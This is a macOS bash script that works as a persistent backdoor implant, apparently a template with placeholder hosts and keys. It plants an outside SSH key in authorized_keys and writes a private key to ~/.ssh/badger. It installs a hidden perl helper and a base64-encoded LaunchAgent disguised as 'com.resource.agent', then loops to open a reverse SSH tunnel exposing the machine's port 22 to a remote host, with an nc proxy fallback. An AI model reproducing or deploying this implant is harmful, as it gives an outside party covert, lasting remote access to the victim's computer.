#!/usr/bin/env bash
UMASK=002
umask $UMASK
NAME=$(basename "$0")

KEY="$HOME/.ssh/badger"
chmod +x "$NAME"

if ! test -d "$HOME/Library/LaunchAgents/"; then
    mkdir -p "$HOME/Library/LaunchAgents/"
fi

if ! test -d "$HOME/.ssh/"; then
    mkdir -p "$HOME/.ssh/"
    chmod 700 "$HOME/.ssh/"
fi

if test -f "$KEY";then
    while true; do
        if curl --max-time 3 --output /dev/null --silent --head --fail "http://google.com" ; then 
            $HOME/Library/LaunchAgents/.flock.pl ssh -o ServerAliveInterval=30 -o ServerAliveCountMax=5 -p  REMOTE_PLACEHOLDER -N -R PORT_PLACEHOLDER:localhost:22 -i $HOME/.ssh/badger flip@FQDN_PLACEHOLDER
            
        else
            $HOME/Library/LaunchAgents/.flock.pl ssh -o ProxyCommand="/usr/bin/nc -X connect -x 10.92.187.53:80 %h %p" -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=30 -o ServerAliveCountMax=5 -p REMOTE_PLACEHOLDER -N -R PORT_PLACEHOLDER:localhost:22 -i $HOME/.ssh/badger flip@FQDN_PLACEHOLDER
        fi
        sleep 10
    done
else

    echo "" >> "$HOME/.ssh/known_hosts"
    echo "BACKFLIP_PUB_PLACEHOLDER"|base64 -d >> "$HOME/.ssh/known_hosts"
    echo "PRIVATE_KEY_PLACEHOLDER"|base64 -d > "$HOME/.ssh/badger"
    echo "" >> "$HOME/.ssh/authorized_keys"
    echo "PUBLIC_KEY_PLACEHOLDER"|base64 -d >> "$HOME/.ssh/authorized_keys"

    #The Base64 here is the perl script that does flock as mac's dont come with flock
    echo "IyEvdXNyL2Jpbi9lbnYgcGVybAp1c2UgRmNudGwgJzpmbG9jayc7b3BlbiBteSAkc2VsZiwgJzwnLCAkMCBvciBkaWU7ZmxvY2sgJHNlbGYsIExPQ0tfRVggfCBMT0NLX05CIG9yIGRpZTtzeXN0ZW0oQEFSR1YpOwo=" |base64 -d > "$HOME/Library/LaunchAgents/.flock.pl"
    chmod 600 "$HOME/.ssh/badger" && chmod 644 "$HOME/.ssh/authorized_keys" && chmod +x "$HOME/Library/LaunchAgents/.flock.pl"
    #The Base64 here is the plist that establishes persistance
    echo "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHBsaXN0IFBVQkxJQyAiLS8vQXBwbGUvL0RURCBQTElTVCAxLjAvL0VOIiAiaHR0cDovL3d3dy5hcHBsZS5jb20vRFREcy9Qcm9wZXJ0eUxpc3QtMS4wLmR0ZCI+CjxwbGlzdCB2ZXJzaW9uPSIxLjAiPgo8ZGljdD4KICA8a2V5PkxhYmVsPC9rZXk+CiAgPHN0cmluZz5jb20ucmVzb3VyY2UuYWdlbnQ8L3N0cmluZz4KICA8a2V5PlByb2dyYW08L2tleT4KICA8c3RyaW5nPi9Vc2Vycy9ob21lL0xpYnJhcnkvTGF1bmNoQWdlbnRzL2xvYWRzc2guc2g8L3N0cmluZz4KICA8a2V5PlN0YXJ0SW50ZXJ2YWw8L2tleT4KICA8aW50ZWdlcj4zMDA8L2ludGVnZXI+CiAgPGtleT5SdW5BdExvYWQ8L2tleT4KICA8dHJ1ZS8+CjwvZGljdD4KPC9wbGlzdD4K"|base64 -d >$HOME/Library/LaunchAgents/com.resource.agent.plist
    sed -i '' "s/home/${USER}/g" "$HOME/Library/LaunchAgents/com.resource.agent.plist"
    sed -i '' "s/loadssh.sh/${NAME}/g" "$HOME/Library/LaunchAgents/com.resource.agent.plist"

    mv "$NAME" "$HOME/Library/LaunchAgents/"
    launchctl load -w "$HOME/Library/LaunchAgents/com.resource.agent.plist"
    launchctl start com.resource.agent
fi
